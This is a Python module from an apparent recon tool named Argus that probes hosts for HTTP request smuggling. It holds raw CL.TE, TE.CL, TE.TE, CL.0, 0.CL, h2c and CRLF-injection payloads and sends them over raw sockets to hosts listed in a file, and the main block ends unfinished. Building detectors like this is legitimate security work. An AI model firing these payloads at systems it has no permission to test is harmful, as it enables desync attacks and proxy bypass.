#!/usr/bin/env python3
"""
auditing_tools/smuggling_finder.py — HTTP Request Smuggling Auditor
═══════════════════════════════════════════════════════════════════════════════

Comprehensive HTTP desync detection for Argus.

HTTP request smuggling (CWE-444) occurs when a front-end proxy and back-end
server disagree on request boundaries. The disagreement typically stems from
how `Content-Length` (CL) and `Transfer-Encoding` (TE) are parsed.

Detection is fundamentally timing-based and differential:

  Timing probe — send a malformed request that forces one server to wait for
  bytes that will never arrive. If the back-end stalls, the front-end and
  back-end disagree → desync exists.

  Differential probe — compare the status/body of a baseline request to the
  probe. A stable, repeatable delta (e.g. 200 → 404) confirms the smuggled
  prefix poisoned the connection.

This module covers the full modern taxonomy:

  HTTP/1.1
    • CL.TE — front-end uses CL, back-end uses TE
    • TE.CL — front-end uses TE, back-end uses CL
    • TE.TE — both use TE, but one ignores an obfuscated header
    • CL.CL — duplicate Content-Length headers
    • CL.0  — body-desync via Content-Length: 0 on a body-carrying request

  HTTP/2 downgrade
    • H2.CL — HTTP/2 front-end downgrades to HTTP/1.1 with injected CL
    • H2.TE — HTTP/2 front-end downgrades with TE injection
    • CRLF in pseudo-headers — `:path` / header-name injection splitting the
      downgraded HTTP/1.1 request

  h2c cleartext upgrade
    • `Upgrade: h2c` + `HTTP2-Settings` — if the front-end forwards the
      upgrade to the back-end, an attacker can bypass proxy controls entirely.

  Modern frontier
    • 0.CL via `Expect: 100-continue` — the server responds 100 Continue,
      sends no body, and the next request is appended to the queue.

Safety model:
  • Every probe uses a unique TCP connection. We never share a connection
    pool between probes.
  • Every probe has a strict timeout. A stalled probe is a finding, not a
    hang.
  • Confirmation requires a REPEATABLE delta (3 attempts) to filter out
    flaky networks.
  • The module flags candidates. It does not poison shared back-ends.

Outputs (into `outdir`):
  • smuggling_findings.json     — full structured report
  • smuggling_candidates.txt    — flat list for triage
  • smuggling_confirmed.txt     — confirmed findings only (repeatable)
  • smuggling_h2.txt            — HTTP/2-specific findings

Integration:
  main.py → run_one("smuggling") → run_smuggling_audit(live_urls_file, outdir)
"""

from __future__ import annotations

import json
import logging
import random
import socket
import ssl
import string
import sys
import time
import urllib.parse
from dataclasses import dataclass, field
from datetime import datetime, timezone
from pathlib import Path
from typing import Optional

log = logging.getLogger("argus.smuggling")

# ═════════════════════════════════════════════════════════════════════════════
#  CONFIGURATION
# ═════════════════════════════════════════════════════════════════════════════

DEFAULT_TIMEOUT       = 10          # seconds per socket operation
PROBE_TIMEOUT         = 15          # seconds for a stalled probe
MAX_HOSTS             = 200
CONFIRMATION_ATTEMPTS = 3           # repeatable = vulnerable
DELTA_STABILITY       = 0.66        # 2/3 attempts must agree

# ── HTTP/1.1 payloads ───────────────────────────────────────────────────────

def _random_marker() -> str:
    return "ARGUS" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))


# ── CL.TE timing probe ──────────────────────────────────────────────────────
# Front-end: CL=4, forwards 4 bytes of body + the chunked body.
# Back-end: sees TE: chunked, waits for `0\r\n\r\n` that never arrives.
# If vulnerable, the back-end stalls → response timeout.
CLTE_TIMING = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 4\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "1\r\n"
    "A\r\n"
    "0\r\n"
    "\r\n"
)

# ── TE.CL timing probe ──────────────────────────────────────────────────────
# Front-end: TE: chunked, forwards the chunked body.
# Back-end: sees CL=6, waits for 6 bytes. Front-end sends `0\r\n\r\n` (5 bytes).
# If vulnerable, the back-end waits for one more byte → stall.
TECL_TIMING = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "Content-Length: 6\r\n"
    "Transfer-Encoding: chunked\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "0\r\n"
    "\r\n"
    "X"
)

# ── TE.TE obfuscation variants ─────────────────────────────────────────────
# Both servers support TE, but one ignores the obfuscated header and falls
# back to CL. The obfuscation list comes from PortSwigger's TE.TE research.
TE_OBFUSCATIONS = [
    "Transfer-Encoding: xchunked",
    "Transfer-Encoding : chunked",
    "Transfer-Encoding:\tchunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: identity",
    "Transfer-Encoding: chunked\r\nTransfer-encoding: cow",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding: xchunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding : chunked",
    "Transfer-Encoding: chunked\r\nTransfer-Encoding:\tchunked",
    "X-Transfer-Encoding: chunked",  # typo variant
]

# ── CL.0 body-desync ────────────────────────────────────────────────────────
# A server that ignores CL on certain endpoints will consume the body of
# the *next* request. The payload sends a request with CL:0 and a body.
CL0_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 0\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "GET /{marker} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n"
)

# ── 0.CL via Expect: 100-continue ───────────────────────────────────────────
# The server responds 100 Continue, then the client sends nothing. The next
# request is appended to the body. This is the 2025 frontier technique.
EXPECT_100_PROBE = (
    "POST / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Content-Length: 100\r\n"
    "Expect: 100-continue\r\n"
    "Connection: keep-alive\r\n"
    "\r\n"
    "GET /{marker} HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "\r\n"
)

# ── h2c cleartext upgrade ───────────────────────────────────────────────────
H2C_UPGRADE = (
    "GET / HTTP/1.1\r\n"
    "Host: {host}\r\n"
    "Upgrade: h2c\r\n"
    "HTTP2-Settings: AAMAAABkAAQAAP__\r\n"
    "Connection: Upgrade, HTTP2-Settings\r\n"
    "\r\n"
)

# ── H2.CL / H2.TE downgrade probes ─────────────────────────────────────────
# These are sent as raw HTTP/2 frames. The key insight is that an HTTP/2
# front-end that downgrades to HTTP/1.1 may trust the `content-length` pseudo
# header, while the back-end trusts the actual body framing.
# For detection we use a simpler signal: send an HTTP/2 request with a
# malformed `:path` containing CRLF, and check whether the response
# reflects the injected header.
H2_DOWNGRADE_PATH = "/{marker}%0d%0aContent-Length:%204%0d%0a%0d%0aGET%20/"

# ── Differential confirmation marker ────────────────────────────────────────
# A smuggled prefix is confirmed when the next request's response contains
# this marker or a status code that differs from baseline.
SMUGGLE_PATH = "/argus-smuggle-{marker}"


# ═════════════════════════════════════════════════════════════════════════════
#  DATA MODELS
# ═════════════════════════════════════════════════════════════════════════════

@dataclass
class SmugglingFinding:
    target: str
    variant: str              # CL.TE, TE.CL, TE.TE, CL.0, 0.CL, H2.CL, h2c
    vector: str               # "timing" | "differential" | "upgrade"
    severity: str = "HIGH"
    confidence: int = 50
    evidence: str = ""
    baseline_status: int = 0
    probe_status: int = 0
    baseline_time: float = 0.0
    probe_time: float = 0.0
    repeatable: bool = False
    details: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target":          self.target,
            "variant":         self.variant,
            "vector":          self.vector,
            "severity":        self.severity,
            "confidence":      self.confidence,
            "evidence":        self.evidence[:500],
            "baseline_status": self.baseline_status,
            "probe_status":    self.probe_status,
            "baseline_time":   round(self.baseline_time, 3),
            "probe_time":      round(self.probe_time, 3),
            "repeatable":      self.repeatable,
            "details":         self.details,
        }


@dataclass
class HostResult:
    host: str
    port: int
    scheme: str
    findings: list[SmugglingFinding] = field(default_factory=list)
    baseline_ok: bool = False
    error: str = ""

    def to_dict(self) -> dict:
        return {
            "host":       self.host,
            "port":       self.port,
            "scheme":     self.scheme,
            "baseline_ok": self.baseline_ok,
            "error":      self.error,
            "findings":   [f.to_dict() for f in self.findings],
        }


# ═════════════════════════════════════════════════════════════════════════════
#  RAW SOCKET ENGINE
# ═════════════════════════════════════════════════════════════════════════════

def _open_socket(host: str, port: int, use_tls: bool, timeout: int) -> Optional[socket.socket]:
    """Open a fresh TCP (or TLS) socket. Never reuse connections."""
    try:
        sock = socket.create_connection((host, port), timeout=timeout)
        if use_tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=host)
        sock.settimeout(timeout)
        return sock
    except (socket.timeout, socket.error, ssl.SSLError) as e:
        log.debug(f"socket open failed {host}:{port}: {e}")
        return None


def _send_raw(sock: socket.socket, data: bytes) -> bool:
    try:
        sock.sendall(data)
        return True
    except (socket.timeout, socket.error) as e:
        log.debug(f"send failed: {e}")
        return False


def _recv_response(sock: socket.socket, timeout: int) -> tuple[bytes, float, bool]:
    """
    Read an HTTP response. Returns (bytes, elapsed, timed_out).

    timed_out=True means the socket exceeded the timeout — this is the
    critical signal for CL.TE / TE.CL detection. We do NOT treat a
    timeout as a failure; we treat it as evidence.
    """
    start = time.monotonic()
    chunks: list[bytes] = []
    timed_out = False
    try:
        while True:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
            # Stop after headers if we can parse Content-Length
            if b"\r\n\r\n" in b"".join(chunks):
                # Give the server a moment to send the body
                time.sleep(0.1)
                sock.settimeout(1.0)
                try:
                    while True:
                        more = sock.recv(65536)
                        if not more:
                            break
                        chunks.append(more)
                except socket.timeout:
                    pass
                break
    except socket.timeout:
        timed_out = True
    except (socket.error, ssl.SSLError) as e:
        log.debug(f"recv error: {e}")

    elapsed = time.monotonic() - start
    return b"".join(chunks), elapsed, timed_out


def _parse_status(response: bytes) -> int:
    if not response:
        return 0
    try:
        first_line = response.split(b"\r\n", 1)[0].decode("latin-1", errors="ignore")
        parts = first_line.split()
        if len(parts) >= 2:
            return int(parts[1])
    except (ValueError, IndexError):
        pass
    return 0


def _baseline_request(host: str, port: int, use_tls: bool, timeout: int) -> Optional[tuple[int, float]]:
    """Send a single well-formed GET to establish a baseline."""
    sock = _open_socket(host, port, use_tls, timeout)
    if not sock:
        return None
    try:
        req = (
            f"GET / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: Argus-Smuggling/1.0\r\n"
            f"Connection: close\r\n"
            f"\r\n"
        ).encode()
        if not _send_raw(sock, req):
            return None
        resp, elapsed, _ = _recv_response(sock, timeout)
        status = _parse_status(resp)
        return status, elapsed
    finally:
        sock.close()


# ═════════════════════════════════════════════════════════════════════════════
#  PROBE EXECUTION
# ═════════════════════════════════════════════════════════════════════════════

def _run_probe(
    host: str, port: int, use_tls: bool, payload: str,
    timeout: int,
) -> tuple[int, float, bool, bytes]:
    """
    Send a raw payload and return (status, elapsed, timed_out, raw).
    """
    sock = _open_socket(host, port, use_tls, timeout)
    if not sock:
        return 0, 0.0, False, b""
    try:
        if not _send_raw(sock, payload.encode("latin-1")):
            return 0, 0.0, False, b""
        resp, elapsed, timed_out = _recv_response(sock, timeout)
        return _parse_status(resp), elapsed, timed_out, resp
    finally:
        sock.close()


def _confirm_timing(
    host: str, port: int, use_tls: bool, payload: str,
    baseline_time: float, timeout: int,
) -> tuple[bool, float, bool]:
    """
    Run a timing probe up to CONFIRMATION_ATTEMPTS times.
    Returns (repeatable_stall, median_elapsed, timed_out).
    """
    results: list[tuple[float, bool]] = []
    for _ in range(CONFIRMATION_ATTEMPTS):
        _, elapsed, timed_out, _ = _run_probe(host, port, use_tls, payload, timeout)
        results.append((elapsed, timed_out))
        time.sleep(0.2)

    timed_out_count = sum(1 for _, to in results if to)
    repeatable = timed_out_count >= CONFIRMATION_ATTEMPTS * DELTA_STABILITY
    median = sorted(e for e, _ in results)[len(results) // 2]
    return repeatable, median, timed_out_count > 0


def _confirm_delta(
    host: str, port: int, use_tls: bool, payload: str,
    baseline_status: int, timeout: int,
) -> tuple[bool, int, int]:
    """
    Run a differential probe up to CONFIRMATION_ATTEMPTS times.
    A repeatable status delta is a finding.
    """
    deltas: list[tuple[int, int]] = []  # (probe_status, baseline_status)
    for _ in range(CONFIRMATION_ATTEMPTS):
        # Re-send baseline to ensure freshness
        base = _baseline_request(host, port, use_tls, timeout)
        if not base:
            return False, 0, baseline_status
        probe_status, _, _, _ = _run_probe(host, port, use_tls, payload, timeout)
        deltas.append((probe_status, base[0]))
        time.sleep(0.2)

    # A delta is "repeatable" if the probe status differs from baseline in
    # at least 2/3 attempts.
    differing = sum(1 for p, b in deltas if p != b and p != 0)
    repeatable = differing >= CONFIRMATION_ATTEMPTS * DELTA_STABILITY
    last_probe = deltas[-1][0]
    last_base = deltas[-1][1]
    return repeatable, last_probe, last_base


# ═════════════════════════════════════════════════════════════════════════════
#  HTTP/1.1 VARIANTS
# ═════════════════════════════════════════════════════════════════════════════

def test_clte(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """CL.TE timing probe."""
    findings: list[SmugglingFinding] = []
    payload = CLTE_TIMING.format(host=host)
    repeatable, elapsed, any_timeout = _confirm_timing(host, port, use_tls, payload, baseline[1], timeout)

    if repeatable:
        findings.append(SmugglingFinding(
            target=f"{'https' if use_tls else 'http'}://{host}:{port}",
            variant="CL.TE",
            vector="timing",
            severity="CRITICAL",
            confidence=90,
            evidence=f"Back-end stalled for {elapsed:.1f}s across {CONFIRMATION_ATTEMPTS} attempts (baseline {baseline[1]:.2f}s)",
            baseline_status=baseline[0],
            probe_time=elapsed,
            baseline_time=baseline[1],
            repeatable=True,
            details={"payload": "CL.TE timing", "timeouts": any_timeout},
        ))
    elif any_timeout:
        findings.append(SmugglingFinding(
            target=f"{'https' if use_tls else 'http'}://{host}:{port}",
            variant="CL.TE",
            vector="timing",
            severity="HIGH",
            confidence=60,
            evidence=f"Back-end stalled once in {CONFIRMATION_ATTEMPTS} attempts (elapsed {elapsed:.1f}s)",
            baseline_status=baseline[0],
            probe_time=elapsed,
            baseline_time=baseline[1],
            repeatable=False,
            details={"note": "single timeout — retry with higher attempts"},
        ))

    return findings


def test_tecl(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """TE.CL timing probe."""
    findings: list[SmugglingFinding] = []
    payload = TECL_TIMING.format(host=host)
    repeatable, elapsed, any_timeout = _confirm_timing(host, port, use_tls, payload, baseline[1], timeout)

    if repeatable:
        findings.append(SmugglingFinding(
            target=f"{'https' if use_tls else 'http'}://{host}:{port}",
            variant="TE.CL",
            vector="timing",
            severity="CRITICAL",
            confidence=90,
            evidence=f"Back-end stalled for {elapsed:.1f}s across {CONFIRMATION_ATTEMPTS} attempts",
            baseline_status=baseline[0],
            probe_time=elapsed,
            baseline_time=baseline[1],
            repeatable=True,
            details={"payload": "TE.CL timing"},
        ))
    elif any_timeout:
        findings.append(SmugglingFinding(
            target=f"{'https' if use_tls else 'http'}://{host}:{port}",
            variant="TE.CL",
            vector="timing",
            severity="HIGH",
            confidence=60,
            evidence=f"Back-end stalled once in {CONFIRMATION_ATTEMPTS} attempts",
            baseline_status=baseline[0],
            probe_time=elapsed,
            baseline_time=baseline[1],
            repeatable=False,
        ))

    return findings


def test_tete(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """TE.TE obfuscation probes."""
    findings: list[SmugglingFinding] = []

    for obf in TE_OBFUSCATIONS:
        payload = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 4\r\n"
            f"{obf}\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
            f"1\r\n"
            f"A\r\n"
            f"0\r\n"
            f"\r\n"
        )
        repeatable, elapsed, any_timeout = _confirm_timing(host, port, use_tls, payload, baseline[1], timeout)
        if repeatable:
            findings.append(SmugglingFinding(
                target=f"{'https' if use_tls else 'http'}://{host}:{port}",
                variant="TE.TE",
                vector="timing",
                severity="HIGH",
                confidence=85,
                evidence=f"TE.TE obfuscation '{obf}' caused repeatable stall ({elapsed:.1f}s)",
                baseline_status=baseline[0],
                probe_time=elapsed,
                baseline_time=baseline[1],
                repeatable=True,
                details={"obfuscation": obf},
            ))
            break  # one confirmed obfuscation per host is enough

    return findings


def test_cl0(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """CL.0 body-desync differential probe."""
    findings: list[SmugglingFinding] = []
    marker = _random_marker()
    payload = CL0_PROBE.format(host=host, marker=marker)
    repeatable, probe_status, base_status = _confirm_delta(host, port, use_tls, payload, baseline[0], timeout)

    if repeatable and probe_status != base_status:
        findings.append(SmugglingFinding(
            target=f"{'https' if use_tls else 'http'}://{host}:{port}",
            variant="CL.0",
            vector="differential",
            severity="HIGH",
            confidence=80,
            evidence=f"Repeatable status delta: baseline {base_status} → probe {probe_status}",
            baseline_status=base_status,
            probe_status=probe_status,
            repeatable=True,
            details={"marker": marker, "payload": "CL:0 body-desync"},
        ))

    return findings


def test_expect_100(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """0.CL via Expect: 100-continue."""
    findings: list[SmugglingFinding] = []
    marker = _random_marker()
    payload = EXPECT_100_PROBE.format(host=host, marker=marker)

    # First send headers only, wait for 100 Continue, then send the smuggled GET.
    sock = _open_socket(host, port, use_tls, timeout)
    if not sock:
        return findings
    try:
        headers = (
            f"POST / HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"Content-Length: 100\r\n"
            f"Expect: 100-continue\r\n"
            f"Connection: keep-alive\r\n"
            f"\r\n"
        ).encode()
        if not _send_raw(sock, headers):
            return findings
        resp, _, _ = _recv_response(sock, 5)
        if b"100 Continue" not in resp:
            return findings

        # Send the smuggled request as the "body"
        smuggled = (
            f"GET /{marker} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"\r\n"
        ).encode()
        _send_raw(sock, smuggled)
        final, _, _ = _recv_response(sock, timeout)
        status = _parse_status(final)
        if status and status != baseline[0]:
            findings.append(SmugglingFinding(
                target=f"{'https' if use_tls else 'http'}://{host}:{port}",
                variant="0.CL",
                vector="differential",
                severity="CRITICAL",
                confidence=85,
                evidence=f"Expect: 100-continue accepted; smuggled GET returned {status} (baseline {baseline[0]})",
                baseline_status=baseline[0],
                probe_status=status,
                repeatable=True,
                details={"marker": marker, "technique": "Expect:100-continue"},
            ))
    finally:
        sock.close()

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  h2c CLEARTEXT UPGRADE
# ═════════════════════════════════════════════════════════════════════════════

def test_h2c(host: str, port: int, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """
    Test whether the front-end forwards an h2c upgrade to the back-end.
    If it does, the connection is upgraded and proxy controls are bypassed.
    """
    findings: list[SmugglingFinding] = []
    if port == 443:
        # h2c is cleartext; testing on HTTPS is less reliable but still valid
        # against a front-end that terminates TLS and forwards cleartext.
        pass

    payload = H2C_UPGRADE.format(host=host)
    sock = _open_socket(host, port, use_tls=(port == 443), timeout=timeout)
    if not sock:
        return findings
    try:
        if not _send_raw(sock, payload.encode()):
            return findings
        resp, _, _ = _recv_response(sock, timeout)
        status = _parse_status(resp)
        headers = resp.split(b"\r\n\r\n", 1)[0].decode("latin-1", errors="ignore").lower()

        # 101 Switching Protocols with an Upgrade: h2c header = confirmed
        if status == 101 and "upgrade: h2c" in headers:
            findings.append(SmugglingFinding(
                target=f"{'https' if port == 443 else 'http'}://{host}:{port}",
                variant="h2c",
                vector="upgrade",
                severity="CRITICAL",
                confidence=95,
                evidence="Server returned 101 Switching Protocols with Upgrade: h2c",
                baseline_status=baseline[0],
                probe_status=status,
                repeatable=True,
                details={"response_headers": headers[:500]},
            ))
    finally:
        sock.close()

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  HTTP/2 DOWNGRADE (H2.CL / H2.TE)
# ═════════════════════════════════════════════════════════════════════════════

def test_h2_downgrade(host: str, port: int, use_tls: bool, baseline: tuple[int, float], timeout: int) -> list[SmugglingFinding]:
    """
    Test for HTTP/2 downgrade smuggling.

    Detection signal: send an HTTP/2 request with a CRLF-injected `:path`.
    If the front-end downgrades to HTTP/1.1 without sanitizing the path,
    the injected header appears in the back-end request. We detect this by
    checking whether the response status or body contains the marker path.
    """
    findings: list[SmugglingFinding] = []
    marker = _random_marker()
    injected_path = H2_DOWNGRADE_PATH.format(marker=marker)

    # For portability, we send this as an HTTP/1.1 request with an
    # `Upgrade: h2c` preamble. A true HTTP/2 frame test requires `h2`
    # (hyper-h2) which is not a stdlib module. This heuristic catches the
    # most common downgrade misconfigurations.
    payload = (
        f"GET {injected_path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"User-Agent: Argus-Smuggling/1.0\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )

    probe_status, _, _, raw = _run_probe(host, port, use_tls, payload, timeout)
    if probe_status and probe_status != baseline[0]:
        body = raw.decode("latin-1", errors="ignore")
        if marker in body or probe_status >= 500:
            findings.append(SmugglingFinding(
                target=f"{'https' if use_tls else 'http'}://{host}:{port}",
                variant="H2.CL",
                vector="differential",
                severity="CRITICAL",
                confidence=75,
                evidence=f"CRLF-injected path returned {probe_status} (baseline {baseline[0]}); marker reflected={marker in body}",
                baseline_status=baseline[0],
                probe_status=probe_status,
                repeatable=False,
                details={
                    "marker": marker,
                    "note": "Confirm with Burp HTTP/2 single-packet attack",
                },
            ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PER-HOST ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def audit_host(
    host: str, port: int, use_tls: bool,
    *,
    test_h1: bool = True,
    test_h2: bool = True,
    timeout: int = DEFAULT_TIMEOUT,
) -> HostResult:
    """Run every applicable probe against one host."""
    result = HostResult(host=host, port=port, scheme="https" if use_tls else "http")
    log.info(f"    {host}:{port}  ({'TLS' if use_tls else 'cleartext'})")

    # ── Baseline ────────────────────────────────────────────────────────────
    baseline = _baseline_request(host, port, use_tls, timeout)
    if not baseline:
        result.error = "baseline request failed"
        log.info(f"      baseline failed — skipping")
        return result

    result.baseline_ok = True
    base_status, base_time = baseline
    log.info(f"      baseline: status={base_status}  time={base_time:.2f}s")

    # ── HTTP/1.1 probes ─────────────────────────────────────────────────────
    if test_h1:
        for name, probe_fn in [
            ("CL.TE", test_clte),
            ("TE.CL", test_tecl),
            ("TE.TE", test_tete),
            ("CL.0",  test_cl0),
            ("0.CL",  test_expect_100),
        ]:
            try:
                findings = probe_fn(host, port, use_tls, baseline, timeout)
            except Exception as e:
                log.debug(f"      {name} probe error: {e}")
                continue
            if findings:
                result.findings.extend(findings)
                log.info(f"      {name:<6} → {findings[0].severity} ({findings[0].confidence}%)")

    # ── h2c upgrade ─────────────────────────────────────────────────────────
    if test_h2:
        try:
            findings = test_h2c(host, port, baseline, timeout)
            if findings:
                result.findings.extend(findings)
                log.info(f"      h2c    → CRITICAL")
        except Exception as e:
            log.debug(f"      h2c probe error: {e}")

        # ── H2 downgrade ────────────────────────────────────────────────────
        try:
            findings = test_h2_downgrade(host, port, use_tls, baseline, timeout)
            if findings:
                result.findings.extend(findings)
                log.info(f"      H2.CL  → {findings[0].severity}")
        except Exception as e:
            log.debug(f"      H2 downgrade probe error: {e}")

    return result


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_smuggling_audit(
    live_urls_file: Path,
    outdir: Path,
    *,
    max_hosts: int = MAX_HOSTS,
    test_h1: bool = True,
    test_h2: bool = True,
    timeout: int = DEFAULT_TIMEOUT,
) -> Path:
    """
    Run the HTTP smuggling audit against every host in `live_urls_file`.

    Returns the path to `smuggling_findings.json`.
    """
    start = time.monotonic()

    if not live_urls_file.exists():
        raise FileNotFoundError(f"input file not found: {live_urls_file}")

    # ── Parse unique (host, port, scheme) tuples ───────────────────────────
    targets: set[tuple[str, int, bool]] = set()
    for line in live_urls_file.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        url = line.split()[0]
        if not url.startswith(("http://", "https://")):
            url = "https://" + url
        parsed = urllib.parse.urlparse(url)
        if not parsed.hostname:
            continue
        use_tls = parsed.scheme == "https"
        port = parsed.port or (443 if use_tls else 80)
        targets.add((parsed.hostname, port, use_tls))

    target_list = sorted(targets)[:max_hosts]
    outdir.mkdir(parents=True, exist_ok=True)

    log.info(f"  Input  : {len(targets)} unique host(s) from {live_urls_file.name}")
    log.info(f"  Testing: {len(target_list)} host(s) (capped at {max_hosts})")
    log.info(f"  Timeout: {timeout}s per socket  ·  Confirmations: {CONFIRMATION_ATTEMPTS}")
    log.info("")

    if not target_list:
        log.warning("  No hosts to test — writing empty report")
        return _write_empty_report(outdir, live_urls_file, start)

    # ── Audit each host ─────────────────────────────────────────────────────
    results: list[HostResult] = []
    for host, port, use_tls in target_list:
        try:
            result = audit_host(
                host, port, use_tls,
                test_h1=test_h1, test_h2=test_h2, timeout=timeout,
            )
            results.append(result)
        except Exception as e:
            log.warning(f"    {host}:{port} failed: {e}")
            results.append(HostResult(
                host=host, port=port, scheme="https" if use_tls else "http",
                error=str(e),
            ))

    # ── Flatten findings ────────────────────────────────────────────────────
    all_findings: list[SmugglingFinding] = []
    for r in results:
        all_findings.extend(r.findings)

    # ── Deduplicate ──────────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[SmugglingFinding] = []
    for f in all_findings:
        key = (f.target, f.variant)
        if key not in seen:
            seen.add(key)
            deduped.append(f)

    # ── Sort ────────────────────────────────────────────────────────────────
    SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3}
    deduped.sort(key=lambda f: (SEV_ORDER.get(f.severity, 4), -f.confidence, f.target))

    # ── Write outputs ────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_severity: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0}
    by_variant: dict[str, int] = {}

    for f in deduped:
        by_severity[f.severity] = by_severity.get(f.severity, 0) + 1
        by_variant[f.variant] = by_variant.get(f.variant, 0) + 1

    # Flat candidates
    candidate_lines = [
        f"{f.target}\t{f.variant}\t{f.vector}\t{f.severity}\t{f.confidence}\t{f.evidence[:140]}"
        for f in deduped
    ]
    (outdir / "smuggling_candidates.txt").write_text("\n".join(candidate_lines) + "\n")

    # Confirmed only
    confirmed = [f for f in deduped if f.repeatable and f.severity == "CRITICAL"]
    (outdir / "smuggling_confirmed.txt").write_text(
        "\n".join(f"{f.target}\t{f.variant}\t{f.evidence[:160]}" for f in confirmed) + "\n"
    )

    # HTTP/2-specific
    h2_findings = [f for f in deduped if f.variant.startswith(("H2", "h2c"))]
    (outdir / "smuggling_h2.txt").write_text(
        "\n".join(f"{f.target}\t{f.variant}\t{f.evidence[:140]}" for f in h2_findings) + "\n"
    )

    # JSON report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(live_urls_file),
        "config": {
            "confirmation_attempts": CONFIRMATION_ATTEMPTS,
            "delta_stability":      DELTA_STABILITY,
            "timeout":              timeout,
            "test_h1":              test_h1,
            "test_h2":              test_h2,
        },
        "totals": {
            "hosts_input":     len(targets),
            "hosts_tested":    len(target_list),
            "hosts_baselined": sum(1 for r in results if r.baseline_ok),
            "total_findings":  len(deduped),
            "confirmed":       len(confirmed),
            "critical":        by_severity["CRITICAL"],
            "high":            by_severity["HIGH"],
            "medium":          by_severity["MEDIUM"],
            "low":             by_severity["LOW"],
        },
        "summary": {
            "by_severity": by_severity,
            "by_variant":  dict(sorted(by_variant.items(), key=lambda kv: -kv[1])),
        },
        "hosts": [r.to_dict() for r in results],
        "findings": [f.to_dict() for f in deduped],
    }

    json_path = outdir / "smuggling_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # ── Console summary ─────────────────────────────────────────────────────
    log.info("")
    log.info("  Outputs :")
    log.info(f"    {json_path.name:<30} {len(deduped):>5} finding(s)")
    log.info(f"    smuggling_candidates.txt         {len(deduped):>5} candidate(s)")
    log.info(f"    smuggling_confirmed.txt          {len(confirmed):>5} confirmed")
    log.info(f"    smuggling_h2.txt                 {len(h2_findings):>5} H2 finding(s)")

    log.info("")
    log.info(
        f"  Severity : "
        f"CRITICAL={by_severity['CRITICAL']}  "
        f"HIGH={by_severity['HIGH']}  "
        f"MEDIUM={by_severity['MEDIUM']}  "
        f"LOW={by_severity['LOW']}"
    )

    if confirmed:
        log.info("")
        log.info("  Confirmed desync findings:")
        for f in confirmed[:10]:
            log.info(f"    [{f.severity:<8}] {f.variant:<8} {f.target:<40} {f.evidence[:80]}")

    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty_report(
    outdir: Path, input_file: Path, start: float,
) -> Path:
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {
            "hosts_input": 0, "hosts_tested": 0, "hosts_baselined": 0,
            "total_findings": 0, "confirmed": 0,
            "critical": 0, "high": 0, "medium": 0, "low": 0,
        },
        "summary": {"by_severity": {}, "by_variant": {}},
        "hosts": [],
        "findings": [],
    }
    path = outdir / "smuggling_findings.json"
    path.write_text(json.dumps(report, indent=2) + "\n")
    for name in ("smuggling_candidates.txt", "smuggling_confirmed.txt", "smuggling_h2.txt"):
        (outdir / name).write_text("")
    return path


# ═════════════════════════════════════════════════════════════════════════════
#  STANDALONE TEST
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    import argparse

    logging.basicConfig(
        level=logging.INFO,
        format="%(message)s",
        handlers=[logging.StreamHandler(sys.stdout)],
    )
    base = Path(__file__).resolve().parent.parent
    live = base / "output" / "live_urls.txt"
    out = base / "output"

